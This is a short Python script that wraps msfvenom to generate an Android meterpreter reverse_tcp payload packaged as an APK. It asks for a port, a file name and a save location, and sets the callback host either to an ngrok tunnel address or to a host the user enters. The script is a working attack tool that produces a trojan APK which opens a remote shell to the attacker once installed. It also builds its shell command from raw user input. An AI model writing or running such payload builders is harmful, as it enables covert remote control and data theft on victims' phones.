import subprocess

use = input('Are you using ngrok (yes/no): ')

if use.lower() == 'yes':
    ngrok = a = input("Enter Your LPORT: ")
    ngrok = b = input("Enter Your Apk Name: ")
    ngrok = z = input("Enter Where To Save Payload eg: /sdcard/home: \n")
    
    command = f"./msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.in.ngrok.io LPORT=" + (a) + " R >" + " "+ (z) + "/" + (b) + ".apk"
    subprocess.run(command, shell=True)
    
elif use.lower() == 'no':
    host = c = input("Enter Your LHOST: ")
    host = d = input("Enter LPORT: ")
    host = e = input("Enter The Apk Name: ")
    host = x = input("Enter Where To Save Payload eg: /sdcard/home: \n")
    
    command = f"./msfvenom -p android/meterpreter/reverse_tcp LHOST=" + (c) + " " +"LPORT=" + (d) + " " +  " R >" + " " + (x) +"/" +(e) +".apk"
    subprocess.run(command, shell=True)
    
else:
    print('Type yes or no')